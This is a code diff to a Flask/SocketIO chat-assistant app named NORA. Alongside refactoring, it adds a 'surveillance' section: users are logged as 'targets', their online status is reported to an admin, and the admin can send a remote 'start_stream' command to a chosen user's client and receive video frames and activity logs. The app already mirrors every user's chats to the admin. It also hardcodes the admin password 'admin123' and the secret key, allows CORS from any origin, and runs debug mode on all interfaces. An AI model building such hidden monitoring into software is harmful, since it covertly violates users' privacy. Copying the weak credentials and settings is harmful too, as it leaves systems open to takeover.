@@ -20,8 +20,8 @@ except Exception:
 app = Flask(__name__)
 app.secret_key = "NORA_SECRET_KEY_CHANGE_THIS"
 
-# Initialize SocketIO with Cross-Origin Resource Sharing enabled
-socketio = SocketIO(app, cors_allowed_origins="*")
+# Standard SocketIO setup (Increased buffer for video frames)
+socketio = SocketIO(app, cors_allowed_origins="*", ping_timeout=60, max_http_buffer_size=10000000)
 
 # ========== CONFIGURATION ==========
 USERS_FILE = "users.json"
@@ -135,21 +135,17 @@ def login():
         passwd = data.get('password')
         hashed_pw = hash_password(passwd)
 
-        # 1. Check Admin (Priority: Check JSON first to support password change)
         if user == "admin":
             if "admin" in users:
-                # Admin has customized their profile
                 if users["admin"]["password"] == hashed_pw:
                     session['username'] = "admin"
                     session['name'] = users["admin"]["name"]
                     return jsonify({"status": "success", "role": "admin"})
             elif passwd == "admin123":
-                # Default hardcoded admin
                 session['username'] = "admin"
                 session['name'] = "SYSTEM OVERLORD"
                 return jsonify({"status": "success", "role": "admin"})
         
-        # 2. Check Regular Users
         if user in users and users[user]["password"] == hashed_pw:
             session['username'] = user
             session['name'] = users[user]['name']
@@ -163,11 +159,8 @@ def register():
     if request.method == 'POST':
         data = request.get_json()
         users = safe_load_json(USERS_FILE, {})
-        
-        # Prevent registering 'admin' or duplicates
         if data.get('username') in users or data.get('username') == 'admin':
             return jsonify({"status": "error", "message": "Username taken"})
-            
         users[data.get('username')] = {
             "name": data.get('name'),
             "email": data.get('email'),
@@ -188,59 +181,35 @@ def logout():
 @app.route('/profile')
 def profile():
     if 'username' not in session: return redirect(url_for('login'))
-    
     users = safe_load_json(USERS_FILE, {})
     current_user = session['username']
-    
-    # Defaults if user not in DB (e.g. default admin before first save)
-    user_data = users.get(current_user, {
-        "name": session.get('name', 'Admin'),
-        "email": "",
-        "phone": ""
-    })
-    
+    user_data = users.get(current_user, {"name": session.get('name', 'Admin'), "email": "", "phone": ""})
     return render_template('profile.html', user=current_user, data=user_data, is_admin=(current_user=='admin'))
 
 @app.route('/api/update_profile', methods=['POST'])
 def update_profile():
     if 'username' not in session: return jsonify({"status": "error", "message": "Unauthorized"}), 401
-    
     data = request.get_json()
     users = safe_load_json(USERS_FILE, {})
     current_user = session['username']
-    
     new_password = data.get('password')
     
-    # Handle Admin Updates
     if current_user == 'admin':
-        # Create admin entry if it doesn't exist yet
-        if 'admin' not in users:
-            users['admin'] = {"name": "SYSTEM OVERLORD", "email": "", "phone": "", "created_at": now_ts()}
-        
-        # Admin can ONLY change password
+        if 'admin' not in users: users['admin'] = {"name": "SYSTEM OVERLORD", "email": "", "phone": "", "created_at": now_ts()}
         if new_password:
             users['admin']['password'] = hash_password(new_password)
             safe_save_json(USERS_FILE, users)
             return jsonify({"status": "success", "message": "Admin password updated."})
-        else:
-            return jsonify({"status": "error", "message": "Admin can only update password."})
+        else: return jsonify({"status": "error", "message": "Admin can only update password."})
 
-    # Handle Regular User Updates
     if current_user in users:
-        # Update allowed fields
         users[current_user]['name'] = data.get('name', users[current_user]['name'])
         users[current_user]['email'] = data.get('email', users[current_user]['email'])
         users[current_user]['phone'] = data.get('phone', users[current_user]['phone'])
-        
-        # Update session name to reflect change immediately
         session['name'] = users[current_user]['name']
-
-        if new_password:
-            users[current_user]['password'] = hash_password(new_password)
-            
+        if new_password: users[current_user]['password'] = hash_password(new_password)
         safe_save_json(USERS_FILE, users)
         return jsonify({"status": "success", "message": "Profile updated successfully."})
-    
     return jsonify({"status": "error", "message": "User not found."})
 
 # ========== ROUTES: VIEWS ==========
@@ -252,10 +221,7 @@ def chat():
 
 @app.route('/admin')
 def admin_dashboard():
-    if 'username' not in session or session['username'] != 'admin':
-        return redirect(url_for('login'))
-    
-    # Get user list for sidebar
+    if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login'))
     users_db = safe_load_json(USERS_FILE, {})
     user_list = [{"username": u, "name": v['name']} for u, v in users_db.items() if u != 'admin']
     return render_template('admin.html', name=session['name'], users=user_list)
@@ -275,8 +241,6 @@ def new_session():
     new_sess = {"session_id": datetime.now().strftime("%Y%m%d%H%M%S"), "start_time": now_ts(), "title": "New Operation", "messages": []}
     data["sessions"].append(new_sess)
     safe_save_json(filename, data)
-    
-    # Notify devices to refresh list
     socketio.emit('refresh_sessions', room=session['username'])
     return jsonify(new_sess)
 
@@ -284,13 +248,11 @@ def new_session():
 def rename_session():
     if 'username' not in session: return jsonify({"error": "Unauthorized"}), 401
     req = request.get_json()
-    sess_id = req.get('session_id')
-    new_title = req.get('title')
     filename = CHAT_FILE_TEMPLATE.format(username=session['username'])
     data = safe_load_json(filename, {"sessions": []})
     for s in data["sessions"]:
-        if s["session_id"] == sess_id:
-            s["title"] = new_title
+        if s["session_id"] == req.get('session_id'):
+            s["title"] = req.get('title')
             safe_save_json(filename, data)
             socketio.emit('refresh_sessions', room=session['username'])
             return jsonify({"status": "success"})
@@ -300,11 +262,10 @@ def rename_session():
 def delete_session():
     if 'username' not in session: return jsonify({"error": "Unauthorized"}), 401
     req = request.get_json()
-    sess_id = req.get('session_id')
     filename = CHAT_FILE_TEMPLATE.format(username=session['username'])
     data = safe_load_json(filename, {"sessions": []})
     original = len(data["sessions"])
-    data["sessions"] = [s for s in data["sessions"] if s["session_id"] != sess_id]
+    data["sessions"] = [s for s in data["sessions"] if s["session_id"] != req.get('session_id')]
     if len(data["sessions"]) < original:
         safe_save_json(filename, data)
         socketio.emit('refresh_sessions', room=session['username'])
@@ -315,14 +276,13 @@ def delete_session():
 def clear_session():
     if 'username' not in session: return jsonify({"error": "Unauthorized"}), 401
     req = request.get_json()
-    sess_id = req.get('session_id')
     filename = CHAT_FILE_TEMPLATE.format(username=session['username'])
     data = safe_load_json(filename, {"sessions": []})
     for s in data["sessions"]:
-        if s["session_id"] == sess_id:
+        if s["session_id"] == req.get('session_id'):
             s["messages"] = []
             safe_save_json(filename, data)
-            socketio.emit('sync_clear', {'session_id': sess_id}, room=session['username'])
+            socketio.emit('sync_clear', {'session_id': req.get('session_id')}, room=session['username'])
             return jsonify({"status": "success"})
     return jsonify({"error": "Session not found"}), 404
 
@@ -331,12 +291,11 @@ def clear_session():
 def process_message():
     if 'username' not in session: return jsonify({"error": "Unauthorized"}), 401
     
-    # 1. Gather Data
     user_msg = request.form.get('message', '')
     session_id = request.form.get('session_id')
     use_web = request.form.get('use_web') == 'true' 
     uploaded_file = request.files.get('file')
-    tab_id = request.form.get('tab_id', 'unknown') # To identify source device
+    tab_id = request.form.get('tab_id', 'unknown')
     current_user = session['username']
     
     filename = CHAT_FILE_TEMPLATE.format(username=current_user)
@@ -349,140 +308,108 @@ def process_message():
     if uploaded_file: display_content += f" [Attached: {uploaded_file.filename}]"
     if use_web: display_content += " [WEB SEARCH]"
     
-    # 2. Save User Message
     current_sess["messages"].append({"timestamp": now_ts(), "role": "user", "content": display_content})
     safe_save_json(filename, data)
 
-    # 3. BROADCAST USER MESSAGE (Sync devices + Admin)
-    # To User's Room (Sync)
     socketio.emit('sync_message', {
-        'session_id': session_id,
-        'role': 'user',
-        'sender': 'You',
-        'content': display_content,
-        'origin_tab': tab_id 
+        'session_id': session_id, 'role': 'user', 'sender': 'You', 'content': display_content, 'origin_tab': tab_id 
     }, room=current_user)
     
-    # To Admin Room (Monitor)
     socketio.emit('admin_feed_update', {
-        'user': current_user,
-        'role': 'user',
-        'content': display_content,
-        'timestamp': now_ts()
+        'user': current_user, 'role': 'user', 'content': display_content, 'timestamp': now_ts()
     }, room='admin_monitor')
     
     msg_lower = user_msg.lower()
     response_text = ""
     action = None
     
-    # 4. System Commands
     if not uploaded_file:
         sys_resp, sys_action = execute_system_command(msg_lower)
         if sys_resp:
             response_text = sys_resp
             action = sys_action
             
-    # 5. AI Logic
     if not response_text:
         if OLLAMA_AVAILABLE:
             try:
-                # A. IMAGE
                 if uploaded_file and uploaded_file.mimetype.startswith('image/'):
-                    image_bytes = uploaded_file.read()
-                    res = ollama.generate(model=OLLAMA_VISION_MODEL, prompt=user_msg if user_msg else "Describe this image.", images=[image_bytes])
+                    res = ollama.generate(model=OLLAMA_VISION_MODEL, prompt=user_msg if user_msg else "Describe this image.", images=[uploaded_file.read()])
                     response_text = res['response']
-                
-                # B. TEXT FILE
                 elif uploaded_file and uploaded_file.mimetype.startswith('text/'):
-                    file_content = uploaded_file.read().decode('utf-8')
                     res = ollama.chat(model=OLLAMA_TEXT_MODEL, messages=[
                         {"role": "system", "content": "Analyze the file provided."},
-                        {"role": "user", "content": f"File:\n{file_content}\n\nTask: {user_msg}"}
+                        {"role": "user", "content": f"File:\n{uploaded_file.read().decode('utf-8')}\n\nTask: {user_msg}"}
                     ])
                     response_text = res['message']['content']
-
-                # C. WEB SEARCH
                 elif use_web:
                     search_context = perform_web_search(user_msg)
                     current_date = get_current_date()
-                    
                     if search_context:
-                        system_prompt = (
-                            f"You are NORA. Current Date: {current_date}.\n"
-                            "Use these REAL-TIME SEARCH RESULTS to answer:\n"
-                            f"{search_context}"
-                        )
+                        system_prompt = f"You are NORA. Date: {current_date}. Use these SEARCH RESULTS:\n{search_context}"
                     else:
-                        system_prompt = f"You are NORA. Date: {current_date}. Search failed, use internal knowledge."
-                    
+                        system_prompt = f"You are NORA. Date: {current_date}. Search failed."
                     context_messages = [{"role": "system", "content": system_prompt}]
                     history = current_sess["messages"][-5:] 
-                    for msg in history:
-                        clean = msg["content"].replace("[WEB SEARCH]", "").strip()
-                        context_messages.append({"role": msg["role"], "content": clean})
-                        
+                    for msg in history: context_messages.append({"role": msg["role"], "content": msg["content"].replace("[WEB SEARCH]", "").strip()})
                     res = ollama.chat(model=OLLAMA_TEXT_MODEL, messages=context_messages)
                     response_text = res['message']['content']
-
-                # D. STANDARD CHAT
                 else:
-                    system_prompt = f"You are NORA, an advanced AI Assistant. Current Date: {get_current_date()}."
+                    system_prompt = f"You are NORA. Date: {get_current_date()}."
                     context_messages = [{"role": "system", "content": system_prompt}]
                     history = current_sess["messages"][-20:]
-                    for msg in history:
-                        context_messages.append({"role": msg["role"], "content": msg["content"]})
-
+                    for msg in history: context_messages.append({"role": msg["role"], "content": msg["content"]})
                     res = ollama.chat(model=OLLAMA_TEXT_MODEL, messages=context_messages)
                     response_text = res['message']['content']
+            except Exception as e: response_text = f"System Error: {str(e)}"
+        else: response_text = "System offline. AI module not detected."
 
-            except Exception as e:
-                print(f"AI ERROR: {e}") 
-                response_text = f"System Error: {str(e)}"
-        else:
-            response_text = "System offline. AI module not detected."
-
-    # 6. Save AI Response
     current_sess["messages"].append({"timestamp": now_ts(), "role": "assistant", "content": response_text})
     safe_save_json(filename, data)
 
-    # 7. BROADCAST AI RESPONSE (Sync + Admin)
-    # To User's Room (Sync)
     socketio.emit('sync_message', {
-        'session_id': session_id,
-        'role': 'assistant',
-        'sender': 'NORA',
-        'content': response_text,
-        'origin_tab': 'server', 
-        'action': action
+        'session_id': session_id, 'role': 'assistant', 'sender': 'NORA', 'content': response_text, 'origin_tab': 'server', 'action': action
     }, room=current_user)
 
-    # To Admin Room (Monitor)
     socketio.emit('admin_feed_update', {
-        'user': current_user,
-        'role': 'assistant',
-        'content': response_text,
-        'timestamp': now_ts()
+        'user': current_user, 'role': 'assistant', 'content': response_text, 'timestamp': now_ts()
     }, room='admin_monitor')
 
-    return jsonify({
-        "response": response_text,
-        "timestamp": now_ts(),
-        "action": action
-    })
+    return jsonify({"response": response_text, "timestamp": now_ts(), "action": action})
 
-# ========== SOCKETIO EVENTS ==========
+# ========== SOCKETIO EVENTS: SURVEILLANCE & MONITORING ==========
 @socketio.on('connect')
 def handle_connect():
     if 'username' in session:
-        # Check if Admin
-        if session['username'] == 'admin':
+        user = session['username']
+        if user == 'admin':
             join_room('admin_monitor')
-            print(">>> GOD MODE ACTIVE: Admin monitoring network.")
+            print(">>> GOD MODE: Admin connected.")
         else:
-            # Regular User
-            join_room(session['username'])
-            print(f">>> USER CONNECTED: {session['username']}")
+            join_room(user)
+            print(f">>> TARGET CONNECTED: {user}")
+            socketio.emit('user_status_change', {'user': user, 'status': 'online'}, room='admin_monitor')
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    if 'username' in session:
+        user = session['username']
+        socketio.emit('user_status_change', {'user': user, 'status': 'offline'}, room='admin_monitor')
+
+
+@socketio.on('admin_trigger_surveillance')
+def admin_trigger(data):
+    target = data.get('target_user')
+    print(f"DEBUG: Admin requesting {data.get('type')} from {target}")
+    socketio.emit('remote_command', {'command': 'start_stream', 'type': data.get('type')}, room=target)
+
+
+@socketio.on('stream_frame')
+def handle_stream_frame(data):
+    socketio.emit('admin_receive_stream', data, room='admin_monitor')
+
+@socketio.on('user_activity_log')
+def handle_activity(data):
+    socketio.emit('admin_receive_log', data, room='admin_monitor')
 
 if __name__ == '__main__':
-    # Use socketio.run instead of app.run for WebSocket support
     socketio.run(app, debug=True, host='0.0.0.0', port=5000)
